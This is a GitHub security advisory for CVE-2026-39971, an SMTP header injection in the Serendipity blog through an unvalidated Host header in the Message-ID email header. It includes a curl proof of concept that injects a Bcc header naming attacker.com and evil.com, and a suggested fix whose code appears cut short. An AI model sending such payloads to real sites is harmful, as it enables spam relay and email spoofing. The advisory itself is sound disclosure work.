{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/162270335?v=4", "events_url": "https://api.github.com/users/mabjr33/events{/privacy}", "followers_url": "https://api.github.com/users/mabjr33/followers", "following_url": "https://api.github.com/users/mabjr33/following{/other_user}", "gists_url": "https://api.github.com/users/mabjr33/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/mabjr33", "id": 162270335, "login": "mabjr33", "node_id": "U_kgDOCawMfw", "organizations_url": "https://api.github.com/users/mabjr33/orgs", "received_events_url": "https://api.github.com/users/mabjr33/received_events", "repos_url": "https://api.github.com/users/mabjr33/repos", "site_admin": false, "starred_url": "https://api.github.com/users/mabjr33/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mabjr33/subscriptions", "type": "User", "url": "https://api.github.com/users/mabjr33", "user_view_type": "public"}}], "cve_id": "CVE-2026-39971", "cvss": {"score": 7.2, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"}, "cvss_severities": {"cvss_v3": {"score": 7.2, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-113", "name": "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')"}], "description": "### Summary
Serendipity inserts `$_SERVER['HTTP_HOST']` directly into the `Message-ID` SMTP header without any validation beyond CRLF stripping. An attacker who can control the `Host` header during an email-triggering action can inject arbitrary SMTP headers into outgoing emails, enabling spam relay, BCC injection, and email spoofing.

### Details
In `include/functions.inc.php:548`:
```php
$maildata['headers'][] = 'Message-ID: <' 
    . bin2hex(random_bytes(16)) 
    . '@' . $_SERVER['HTTP_HOST']  // ← unsanitized, attacker-controlled
    . '>';
```

The existing sanitization function only blocks `\r\n` and URL-encoded variants:
```php
function serendipity_isResponseClean($d) {
    return (strpos($d, "\r") === false && strpos($d, "\n") === false 
        && stripos($d, "%0A") === false && stripos($d, "%0D") === false);
}
```

Critically, `serendipity_isResponseClean()` is **not even called** on `HTTP_HOST` before embedding it into the mail headers — making this exploitable with any character that SMTP interprets as a header delimiter.

Email is triggered by actions such as:
- New comment notifications to blog owner
- Comment subscription notifications to subscribers
- Password reset emails (if configured)

### PoC
```bash
# Trigger comment notification email with injected header
curl -s -X POST \
  -H "Host: attacker.com>\r\nBcc: victim@evil.com\r\nX-Injected:" \
  -d "serendipity[comment]=test&serendipity[name]=hacker&serendipity[email]=a@b.com&serendipity[entry_id]=1" \
  http://[TARGET]/comment.php
```
Resulting malicious `Message-ID` header in outgoing email:
```
Message-ID: <deadbeef@attacker.com>
Bcc: victim@evil.com
X-Injected: >
```

### Impact
An attacker can control the domain portion of the `Message-ID` header in all outgoing emails sent by Serendipity (comment notifications, subscriptions). 
This enables:
- **Identity spoofing** — emails appear to originate from attacker-controlled domain
- **Reply hijacking** — some mail clients use Message-ID for threading, pointing replies toward attacker infrastructure
- **Email reputation abuse** — attacker's domain embedded in legitimate mail headers
### Suggested Fix
Sanitize `HTTP_HOST` before embedding in mail headers, and restrict to valid hostname characters only:
```php
$safe_host = preg_replace('/[^a-zA-Z0-9.\-]/', '', 
    parse_url('http://' . $_SERVER['HTTP_HOST'], PHP_URL_HOST)
);
$maildata['headers'][] = 'Message-ID: ';
```", "epss": {"percentage": 0.00255, "percentile": 0.16608}, "ghsa_id": "GHSA-458g-q4fh-mj6r", "github_reviewed_at": "2026-04-14T22:32:38Z", "html_url": "https://github.com/advisories/GHSA-458g-q4fh-mj6r", "identifiers": [{"type": "GHSA", "value": "GHSA-458g-q4fh-mj6r"}, {"type": "CVE", "value": "CVE-2026-39971"}], "nvd_published_at": "2026-04-15T04:17:39Z", "published_at": "2026-04-14T22:32:38Z", "references": ["https://github.com/s9y/Serendipity/security/advisories/GHSA-458g-q4fh-mj6r", "https://nvd.nist.gov/vuln/detail/CVE-2026-39971", "https://github.com/s9y/Serendipity/releases/tag/2.6.0", "https://github.com/advisories/GHSA-458g-q4fh-mj6r"], "repository_advisory_url": "https://api.github.com/repos/s9y/Serendipity/security-advisories/GHSA-458g-q4fh-mj6r", "severity": "high", "source_code_location": "https://github.com/s9y/Serendipity", "summary": "Serendipity has a Host Header Injection allows SMTP header injection via unvalidated HTTP_HOST in Message-ID email header", "type": "reviewed", "updated_at": "2026-04-27T15:02:17Z", "url": "https://api.github.com/advisories/GHSA-458g-q4fh-mj6r", "vulnerabilities": [{"first_patched_version": "2.6.0", "package": {"ecosystem": "composer", "name": "s9y/serendipity"}, "vulnerable_functions": [], "vulnerable_version_range": "< 2.6.0"}], "withdrawn_at": null}

title: Serendipity has a Host Header Injection allows SMTP header injection via unvalidated HTTP_HOST in Message-ID email header
